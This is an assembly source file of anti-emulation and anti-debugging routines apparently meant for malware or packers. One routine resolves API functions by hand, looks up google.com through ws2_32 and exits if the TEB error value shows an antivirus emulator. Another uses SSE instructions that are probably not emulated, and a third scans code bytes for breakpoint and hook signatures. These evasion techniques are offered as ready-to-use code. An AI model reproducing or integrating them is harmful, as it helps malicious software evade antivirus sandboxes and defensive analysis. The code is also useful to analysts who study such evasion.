            assume ebp:ptr vars
                
;antiemul1 by my_creed recoded to support dep 
;
            XOR_VAL  = 13248658h
            TEST_VAL = 276D276Dh XOR XOR_VAL 

stopemul:       pushad

            push_sz <LoadLibraryA\000>
            push esp
            call get_kernel
            push eax
            call MyGetProcAddress
            add esp,16
            test eax,eax
            jz @f
            mov edx,eax

            ; load socket dll
            push_sz <ws2_32.dll\000\000>
            push esp 
            call edx ; LoadLibrary 
            add esp,16 
            test eax,eax
            jz @f
                
            ; get gethostbyname
            push_sz <gethostbyname\000>
            push esp
            push eax
            call MyGetProcAddress
            add esp,16
            test eax,eax
            jz @f
            mov edi,eax
                
            push_sz <google.com\000\000>
            push esp
            call edi ; call get host by name
            add esp,16
                
            ; GetLastError from teb
            assume fs:nothing
            mov eax,dword ptr fs:[34h]
            imul eax,10001h
            xor eax,XOR_VAL
                
            ; compare results
            cmp eax,TEST_VAL
            jz @f

            push_sz <ExitProcess\000>
            push esp
            call get_kernel
            push eax
            call MyGetProcAddress
            add esp,12 
                
            push 0
            call eax ; ExitProcess   

@@:         popad
            retn  
                
; antiemul2 use probably not emulated sse instructions
antiemul2:      push eax
            db 0fh, 02fh, 0c0h; comiss 
            xor eax,eax ; junk ;)
            db 0fh, 02ah, 0c0h;cvtpi2ps 
            pop eax  
            retn                
            

;---------------------------------------------------------------------------;
;                             simple bpx check                              ; 
;---------------------------------------------------------------------------; 
;eax = address
; return 0 - not detected
;        1 - detected 
            VAL = 99h

detect_bpx:     push esi
            push ecx
            mov esi,eax
            mov ecx,5

detect_loop:        xor eax,eax 
            lodsb
            xor eax,VAL
            cmp eax,0cch xor VAL ; int3
            je bpx_detected
            cmp eax,0cdh xor VAL ; int x
            je bpx_detected
            cmp eax,090h xor VAL ; nop
            je bpx_detected
            cmp eax,0e8h xor VAL ; call rel32
            je bpx_detected
            cmp eax,0e9h xor VAL ; jmp rel32
            je bpx_detected 
            cmp eax,0fah xor VAL ; cli 
            je bpx_detected
            cmp eax,0fbh xor VAL ; sti
            je bpx_detected
            loop detect_loop

not_detected:       xor eax,eax
            jmp detect_end
                
bpx_detected:       xor eax,eax
            inc eax 

detect_end:     pop ecx
            pop esi
            retn
        
